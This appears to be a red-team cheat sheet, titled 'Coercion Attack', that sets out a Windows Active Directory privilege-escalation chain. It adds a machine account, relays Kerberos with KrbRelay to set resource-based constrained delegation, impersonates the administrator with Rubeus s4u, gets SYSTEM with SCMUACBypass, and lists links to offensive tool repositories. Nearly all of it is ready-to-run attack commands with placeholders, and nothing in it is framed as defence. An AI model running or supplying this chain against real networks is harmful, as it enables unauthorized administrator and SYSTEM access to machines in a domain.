# Coercion Attack

## Prerequisites
```
LDAP Signing should not to be enforced
ms-DS-MachineAccountQuota != 0  
```

### Add a computer account
```
Sharpmad.exe MAQ -Action new -MachineAccount &lt;newComputer&gt; -MachinePassword &lt;newPassword&gt;
or
New-MachineAccount -MachineAccount &lt;newComputer&gt; -Password $(ConvertTo-SecureString '&lt;newPassword&gt;' -AsPlainText -Force)
```

### Get SID of new computer object 
```
$o = ([ADSI]"LDAP://CN=&lt;newComputer&gt;,CN=Computers,DC=&lt;domainComponent&gt;,DC=&lt;domainComponent&gt;").objectSID
(New-Object System.Security.Principal.SecurityIdentifier($o.value, 0)).Value
```

### Modify msDS-AllowedToActOnBehalfOfOtherIdentity by relaying kerberos - Get suitable COM port for kerberos relaying
```
CheckPort.exe
```


### Modify msDS-AllowedToActOnBehalfOfOtherIdentity by relaying kerberos
```
KrbRelay.exe -spn ldap/&lt;domainControllerFqdn&gt; -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd &lt;newComputerSid&gt; -port &lt;port&gt;
```

### Get TGT for local admin
```
Rubeus.exe hash /password:&lt;newPassword&gt;
Rubeus.exe s4u /user:&lt;newComputer&gt; /rc4:&lt;ntHashNewPassword&gt; /impersonateuser:administrator /msdsspn:host/&lt;targetComputerFqdn&gt; /ptt
```

### Get SYSTEM by patching the Win32 API in Service Control Manager 
```
SCMUACBypass.exe
```

### Cleanup service created by SCMUACBypass
```
sc delete &lt;service&gt;
```

## Tools / References
* https://github.com/Kevin-Robertson/Sharpmad
* https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
* https://github.com/cube0x0/KrbRelay
* https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.0_Any/Rubeus.exe
* https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1
* https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82 (compile using: cl -DUNICODE SCMUACBypass.cpp advapi32.lib)
* https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9


